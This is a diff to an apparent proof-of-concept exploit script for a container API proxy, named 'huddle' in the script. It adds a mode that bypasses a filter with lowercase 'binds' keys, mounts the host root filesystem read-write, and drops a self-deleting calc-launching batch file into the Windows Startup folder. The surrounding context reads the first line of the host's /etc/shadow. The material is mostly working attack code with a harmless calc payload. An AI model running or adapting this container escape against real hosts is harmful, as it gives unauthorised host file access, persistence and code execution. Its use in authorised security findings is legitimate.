@@ -12,6 +12,7 @@
 #   names:  1a   #1 top-level lowercase `hostconfig`      → pop calc (host PID ns)
 #           1b   #1 nested lowercase keys under HostConfig → pop calc (host PID ns)
 #           1c   #1 minimal: `binds` only                 → host-fs read+write
+#           fs   #1 filesystem-only calc pop               → write calc.bat to Startup
 #           7    #7 privileged exec-create                → host raw-disk (best-effort)
 #           mask MaskedPaths unmask (NON-destructive probe, no sysrq)
 #           list show this table
@@ -172,9 +173,46 @@ echo "host hostname: $(cat /host/etc/hostname 2>/dev/null)"
 echo "host /etc/shadow line 1: $(head -1 /host/etc/shadow 2>/dev/null)"
 echo "wrote proof (host) $P"'
   CID=$(create_raw "huddle-$STAMP" \
-    "{\"Image\":\"$IMAGE\",\"Cmd\":$(cmd_json "$HOSTFS"),\"hostconfig\":{\"binds\":[\"/:/host\"]}}")
+    "{\"Image\":\"$IMAGE\",\"Cmd\":$(cmd_json "$HOSTFS"),\"HostConfig\":{\"binds\":[\"/:/host\"]}}")
   [[ -z "$CID" ]] && refused
   CLEAN_IDS+=("$CID"); echo "[+] created $CID (host / mounted at /host, rw)"; run_and_log "$CID"
+  ;;
+# ── Finding #1 (fs): filesystem-only calc pop via lowercase `binds` ───────────
+# No privileged, no pidmode, no nsenter. Mount host rootfs via the 1b-style
+# bypass (lowercase `binds` under properly-cased `HostConfig`), then write a
+# calc.bat to the Windows Startup folder. Explorer runs it on next login cycle
+# (or instantly if shell is watching the folder). Self-cleans after 10s.
+fs)
+  pull
+  FSPOP='set +e
+echo "[*] host rootfs at /host — looking for Windows users ..."
+STARTUP=""
+for d in /host/mnt/c/Users/*/AppData/Roaming/Microsoft/Windows/Start\ Menu/Programs/Startup; do
+  [ -d "$d" ] && { STARTUP="$d"; break; }
+done
+if [ -z "$STARTUP" ]; then
+  echo "[!] no Startup folder found — trying ProgramData"
+  STARTUP="/host/mnt/c/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup"
+  mkdir -p "$STARTUP" 2>/dev/null
+fi
+echo "[+] target: $STARTUP"
+BAT="$STARTUP/huddle-poc.bat"
+cat > "$BAT" << "BATEOF"
+@echo off
+start calc
+del "%~f0"
+BATEOF
+echo "[+] wrote $BAT (self-deleting — launches calc then removes itself)"
+echo "[*] proof: host /etc/hostname = $(cat /host/etc/hostname 2>/dev/null)"
+echo "[*] proof: wrote bat with content:"
+cat "$BAT"
+echo "[*] waiting 10s for Explorer to pick it up, then cleaning ..."
+sleep 10
+rm -f "$BAT" 2>/dev/null && echo "[+] cleaned up $BAT" || echo "[!] cleanup failed (already executed and self-deleted?)"'
+  CID=$(create_raw "huddle-$STAMP" \
+    "{\"Image\":\"$IMAGE\",\"Cmd\":$(cmd_json "$FSPOP"),\"HostConfig\":{\"binds\":[\"/:/host\"]}}")
+  [[ -z "$CID" ]] && refused
+  CLEAN_IDS+=("$CID"); echo "[+] created $CID (host / at /host via lowercase binds bypass)"; run_and_log "$CID"
   ;;
 # ── Finding #7: privileged exec-create ───────────────────────────────────────
 # Create a NORMAL (allowed) container, then exec into it with Privileged:true.
